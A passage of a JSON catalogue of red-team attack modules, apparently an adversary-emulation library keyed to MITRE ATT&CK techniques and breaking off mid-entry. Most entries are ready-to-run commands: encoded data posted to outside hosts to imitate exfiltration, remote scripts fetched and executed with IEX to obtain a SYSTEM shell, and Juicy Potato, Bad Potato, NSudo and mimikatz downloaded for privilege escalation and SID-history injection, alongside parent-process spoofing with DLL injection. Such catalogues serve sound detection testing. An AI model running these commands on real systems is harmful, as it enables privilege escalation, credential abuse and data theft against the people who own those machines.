          "name": "vib_install",
          "description": "Path to script with commands to install the vib",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\rx_modules\\T1129\\src\\esxi_vibinstall.txt"
        },
        {
          "name": "vib_remove",
          "description": "Path to script with commands to remove the vib",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\rx_modules\\T1129\\src\\esxi_vibremove.txt"
        },
        {
          "name": "vib_file",
          "description": "Path to the dummy vib",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\rx_modules\\T1129\\src\\ragloxvibes.vib"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if plink and pscp are available.\n",
          "check_command": "if (Test-Path \"#{plink_file}\") {exit 0} else {exit 1}\nif (Test-Path \"#{pscp_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\plink.exe\"\nInvoke-WebRequest \"https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\pscp.exe\"\n"
        }
      ],
      "rx_module_id": "7f843046-abf2-443f-b880-07a83cf968ec",
      "module_name": "ESXi - Install a custom VIB on an ESXi host"
    },
    {
      "index": 831,
      "technique_id": "T1132.001",
      "technique_name": "Data Encoding: Standard Encoding",
      "description": "Utilizing a common technique for posting base64 encoded data.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "destination_url",
          "description": "Destination URL to post encoded data.",
          "type": "url",
          "default_value": "redcanary.com"
        },
        {
          "name": "base64_data",
          "description": "Encoded data to post using fake Social Security number 111-11-1111.",
          "type": "string",
          "default_value": "MTExLTExLTExMTE="
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25",
      "module_name": "Base64 Encoded data."
    },
    {
      "index": 832,
      "technique_id": "T1132.001",
      "technique_name": "Data Encoding: Standard Encoding",
      "description": "Utilizing a common technique for posting base64 encoded data.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "destination_url",
          "description": "Destination URL to post encoded data.",
          "type": "url",
          "default_value": "redcanary.com"
        },
        {
          "name": "base64_data",
          "description": "Encoded data to post using fake Social Security number 111-11-1111.",
          "type": "string",
          "default_value": "MTExLTExLTExMTE="
        }
      ],
      "prerequisites": [
        {
          "description": "Requires curl\n",
          "check_command": "if [ -x \"$(command -v curl)\" ]; then exit 0; else exit 1; fi;      \n",
          "install_command": "pkg install -y curl\n"
        }
      ],
      "rx_module_id": "2d97c626-7652-449e-a986-b02d9051c298",
      "module_name": "Base64 Encoded data (freebsd)"
    },
    {
      "index": 833,
      "technique_id": "T1132.001",
      "technique_name": "Data Encoding: Standard Encoding",
      "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "destination_url",
          "description": "Destination URL to post encoded data.",
          "type": "url",
          "default_value": "example.com"
        },
        {
          "name": "plaintext",
          "description": "Plain text mimicking victim data sent to C2 server.",
          "type": "string",
          "default_value": "Path\\n----\\nC:\\Users\\victim"
        },
        {
          "name": "key",
          "description": "XOR key used for encoding the plaintext.",
          "type": "string",
          "default_value": "abcdefghijklmnopqrstuvwxyz123456"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08",
      "module_name": "XOR Encoded data."
    },
    {
      "index": 834,
      "technique_id": "T1133",
      "technique_name": "External Remote Services",
      "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n",
        "elevation_required": true,
        "cleanup_command": "$extList = #{extension_id}\nforeach ($extension in $extList) {\nRemove-Item -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -ErrorAction Ignore}\n"
      },
      "variables": [
        {
          "name": "chrome_url",
          "description": "chrome installer download URL",
          "type": "url",
          "default_value": "https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe"
        },
        {
          "name": "extension_id",
          "description": "chrome extension id",
          "type": "string",
          "default_value": "\"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"\n"
        }
      ],
      "prerequisites": [
        {
          "description": "Chrome must be installed\n",
          "check_command": "if ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.exe\" #{chrome_url}\nStart-Process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.exe\" /S\n"
        }
      ],
      "rx_module_id": "4c8db261-a58b-42a6-a866-0a294deedde4",
      "module_name": "Running Chrome VPN Extensions via the Registry 2 vpn extension"
    },
    {
      "index": 835,
      "technique_id": "T1134.001",
      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
      "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "90db9e27-8e7c-4c04-b602-a45927884966",
      "module_name": "Named pipe client impersonation"
    },
    {
      "index": 836,
      "technique_id": "T1134.001",
      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
      "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "34f0a430-9d04-4d98-bcb5-1989f14719f0",
      "module_name": "`SeDebugPrivilege` token duplication"
    },
    {
      "index": 837,
      "technique_id": "T1134.001",
      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
      "description": "Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{nsudo_path}\" -Argument \"-U:T -P:E cmd\"\nStart-Sleep -Second 5\nStop-Process -Name \"cmd\" -force -erroraction silentlycontinue\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "nsudo_path",
          "description": "Path to the NSudoLG.exe file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1134.001\\bin\\NSudoLG.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "NSudoLG.exe must exist in the specified path #{nsudo_path}\n",
          "check_command": "if (Test-Path \"#{nsudo_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" \"https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip\"\nExpand-Archive -Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -DestinationPath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Force\nCopy-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo Launcher\\x64\\NSudoLG.exe\" \"#{nsudo_path}\"\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components.zip\" -Recurse -ErrorAction Ignore\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\" -Recurse -ErrorAction Ignore\n"
        }
      ],
      "rx_module_id": "7be1bc0f-d8e5-4345-9333-f5f67d742cb9",
      "module_name": "Launch NSudo Executable"
    },
    {
      "index": 838,
      "technique_id": "T1134.001",
      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
      "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cd \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\nStart-Process .\\BadPotato.exe notepad.exe\nStart-Sleep -Second 20\nStop-Process -Name \"notepad\" -force -erroraction silentlycontinue\nStop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue\n",
        "elevation_required": true,
        "cleanup_command": "taskkill /f /im notepad.exe\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "BadPotato.exe must exist in the temp directory\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\BadPotato.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\BadPotato.exe\" \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1134.001/bin/BadPotato.exe?raw=true\"\n"
        }
      ],
      "rx_module_id": "9c6d799b-c111-4749-a42f-ec2f8cb51448",
      "module_name": "Bad Potato"
    },
    {
      "index": 839,
      "technique_id": "T1134.001",
      "technique_name": "Access Token Manipulation: Token Impersonation/Theft",
      "description": "This RAGLOX utilizes Juicy Potato to obtain privilege escalation. \nUpon successful execution of this test, a vulnerable CLSID will be used to execute a process with system permissions.\nThis tactic has been previously observed in SnapMC Ransomware, amongst numerous other campaigns. \n[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'\n",
        "elevation_required": true,
        "cleanup_command": "get-ciminstance Win32_Process | where-object { $_.Path -eq \"#{target_exe}\" } | invoke-cimmethod -methodname \"terminate\" | out-null\nget-ciminstance Win32_Process | where-object { $_.Path -eq \"#{potato_path}\" } | invoke-cimmethod -methodname \"terminate\" | out-null\n"
      },
      "variables": [
        {
          "name": "potato_path",
          "description": "Path to the JuicyPotato.exe file",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\JuicyPotato.exe"
        },
        {
          "name": "listening_port",
          "description": "COM server listen port",
          "type": "integer",
          "default_value": 7777
        },
        {
          "name": "target_exe",
          "description": "Target executable to launch with system privileges",
          "type": "path",
          "default_value": "$env:windir\\system32\\notepad.exe"
        },
        {
          "name": "target_CLSID",
          "description": "Vulnerable CLSID to impersonate privileges",
          "type": "string",
          "default_value": "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
        }
      ],
      "prerequisites": [
        {
          "description": "JuicyPotato.exe must exist on disk\n",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\JuicyPotato.exe\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\JuicyPotato.exe\" \"https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe\"\n"
        }
      ],
      "rx_module_id": "f095e373-b936-4eb4-8d22-f47ccbfbe64a",
      "module_name": "Juicy Potato"
    },
    {
      "index": 840,
      "technique_id": "T1134.002",
      "technique_name": "Create Process with Token",
      "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ExecutionPolicy -Scope Process Bypass -Force\n$owners = @{}\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}\nGet-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}\n& \"$PathToRagloxModulesFolder\\T1134.002\\src\\GetToken.ps1\"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "dbf4f5a9-b8e0-46a3-9841-9ad71247239e",
      "module_name": "Access Token Manipulation"
    },
    {
      "index": 841,
      "technique_id": "T1134.002",
      "technique_name": "Create Process with Token",
      "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ccf4ac39-ec93-42be-9035-90e2f26bcd92",
      "module_name": "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique"
    },
    {
      "index": 842,
      "technique_id": "T1134.004",
      "technique_name": "Access Token Manipulation: Parent PID Spoofing",
      "description": "This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, \"Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####\" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": ". \"$PathToRagloxModulesFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nPPID-Spoof -ppid $ppid -spawnto \"#{spawnto_process_path}\" -dllpath \"#{dll_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "Stop-Process -Name \"#{dll_process_name}\" -ErrorAction Ignore\nStop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "parent_process_name",
          "description": "Name of the parent process",
          "type": "string",
          "default_value": "explorer"
        },
        {
          "name": "spawnto_process_path",
          "description": "Path of the process to spawn",
          "type": "path",
          "default_value": "C:\\Program Files\\Internet Explorer\\iexplore.exe"
        },
        {
          "name": "dll_process_name",
          "description": "Name of the created process from the injected dll",
          "type": "string",
          "default_value": "calculator"
        },
        {
          "name": "dll_path",
          "description": "Path of the dll to inject",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1134.004\\bin\\calc.dll"
        },
        {
          "name": "spawnto_process_name",
          "description": "Name of the process to spawn",
          "type": "string",
          "default_value": "iexplore"
        }
      ],
      "prerequisites": [
        {
          "description": "DLL to inject must exist on disk at specified location (#{dll_path})\n",
          "check_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1134.004/bin/calc.dll\" -OutFile \"#{dll_path}\"\n"
        },
        {
          "description": "PPID.ps1 must exist on disk at $PathToRagloxModulesFolder\\T1134.004\\src\\PPID-Spoof.ps1\n",
          "check_command": "if (Test-Path \"$PathToRagloxModulesFolder\\T1134.004\\src\\PPID-Spoof.ps1\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"$PathToRagloxModulesFolder\\T1134.004\\src\\PPID-Spoof.ps1\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1134.004/src/PPID-Spoof.ps1\" -OutFile \"$PathToRagloxModulesFolder\\T1134.004\\src\\PPID-Spoof.ps1\"\n"
        }
      ],
      "rx_module_id": "069258f4-2162-46e9-9a25-c9c6c56150d2",
      "module_name": "Parent PID Spoofing using PowerShell"
    },
    {
      "index": 843,
      "technique_id": "T1134.004",
      "technique_name": "Access Token Manipulation: Parent PID Spoofing",
      "description": "Spawns a powershell.exe process as a child of the current process.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "File path or name of process to spawn",
          "type": "path",
          "default_value": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        },
        {
          "name": "parent_pid",
          "description": "PID of process to spawn from",
          "type": "string",
          "default_value": "$PID"
        },
        {
          "name": "command_line",
          "description": "Specified command line to use",
          "type": "string",
          "default_value": "-Command Start-Sleep 10"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "14920ebd-1d61-491a-85e0-fe98efe37f25",
      "module_name": "Parent PID Spoofing - Spawn from Current Process"
    },
    {
      "index": 844,
      "technique_id": "T1134.004",
      "technique_name": "Access Token Manipulation: Parent PID Spoofing",
      "description": "Spawns a notepad.exe process as a child of the current process.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid #{test_guid}",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "parent_pid",
          "description": "PID of process to spawn from",
          "type": "string",
          "default_value": "$PID"
        },
        {
          "name": "test_guid",
          "description": "Defined test GUID",
          "type": "string",
          "default_value": "12345678-1234-1234-1234-123456789123"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "cbbff285-9051-444a-9d17-c07cd2d230eb",
      "module_name": "Parent PID Spoofing - Spawn from Specified Process"
    },
    {
      "index": 845,
      "technique_id": "T1134.004",
      "technique_name": "Access Token Manipulation: Parent PID Spoofing",
      "description": "Spawnd a process as a child of the first accessible svchost.exe process.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter \"Name = 'svchost.exe' AND CommandLine LIKE '%'\" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_line",
          "description": "Specified command line to use",
          "type": "string",
          "default_value": "-Command Start-Sleep 10"
        },
        {
          "name": "file_path",
          "description": "File path or name of process to spawn",
          "type": "path",
          "default_value": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "e9f2b777-3123-430b-805d-5cedc66ab591",
      "module_name": "Parent PID Spoofing - Spawn from svchost.exe"
    },
    {
      "index": 846,
      "technique_id": "T1134.004",
      "technique_name": "Access Token Manipulation: Parent PID Spoofing",
      "description": "Creates a notepad.exe process and then spawns a powershell.exe process as a child of it.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_line",
          "description": "Specified command line to use",
          "type": "string",
          "default_value": "-Command Start-Sleep 10"
        },
        {
          "name": "file_path",
          "description": "File path or name of process to spawn",
          "type": "path",
          "default_value": "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        },
        {
          "name": "parent_name",
          "description": "Parent process to spoof from",
          "type": "path",
          "default_value": "$Env:windir\\System32\\notepad.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The RAGLOXTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent must be exported in the module.",
          "check_command": "$RequiredModule = Get-Module -Name RAGLOXTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}",
          "install_command": "Install-Module -Name RAGLOXTestHarnesses -Scope CurrentUser -Force\n"
        }
      ],
      "rx_module_id": "2988133e-561c-4e42-a15f-6281e6a9b2db",
      "module_name": "Parent PID Spoofing - Spawn from New Process"
    },
    {
      "index": 847,
      "technique_id": "T1134.005",
      "technique_name": "Access Token Manipulation: SID-History Injection",
      "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{mimikatz_path} \"privilege::debug\" \"sid::patch\" \"sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}\" \"exit\"\n",
        "elevation_required": true,
        "cleanup_command": "#{mimikatz_path} \"sid::clear /sam:#{sam_account_name}\" \"exit\"\n"
      },
      "variables": [
        {
          "name": "sid_to_inject",
          "description": "SID to inject into sidhistory",
          "type": "string",
          "default_value": "S-1-5-21-1004336348-1177238915-682003330-1134"
        },
        {
          "name": "sam_account_name",
          "description": "Target account to modify",
          "type": "string",
          "default_value": "$env:username"
        },
        {
          "name": "mimikatz_path",
          "description": "Mimikatz windows executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
          "check_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
          "install_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-raglox/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
        }
      ],
      "rx_module_id": "6bef32e5-9456-4072-8f14-35566fb85401",
      "module_name": "Injection SID-History with mimikatz"
    },
    {
      "index": 848,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Network Share Discovery\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "df -aH\nsmbutil view -g //#{computer_name}\nshowmount #{computer_name}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "Computer name to find a mount on.",
          "type": "string",
          "default_value": "computer1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f94b5ad9-911c-4eff-9718-fd21899db4f7",
      "module_name": "Network Share Discovery"
    },
    {
      "index": 849,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Network Share Discovery using smbstatus\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "smbstatus --shares\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "package_checker",
          "description": "Package checking command. Debian - dpkg -s samba",
          "type": "string",
          "default_value": "(rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)"
        },
        {
          "name": "package_installer",
          "description": "Package installer command. Debian - apt install samba",
          "type": "string",
          "default_value": "(which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"
        }
      ],
      "prerequisites": [
        {
          "description": "Package with smbstatus (samba) must exist on device\n",
          "check_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
          "install_command": "#{package_installer}\n"
        }
      ],
      "rx_module_id": "875805bc-9e86-4e87-be86-3a5527315cae",
      "module_name": "Network Share Discovery - linux"
    },
    {
      "index": 850,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Network Share Discovery using smbstatus\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "smbstatus --shares\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "package_checker",
          "description": "Package checking command. pkg info -x samba",
          "type": "string",
          "default_value": "(pkg info -x samba &>/dev/null)"
        },
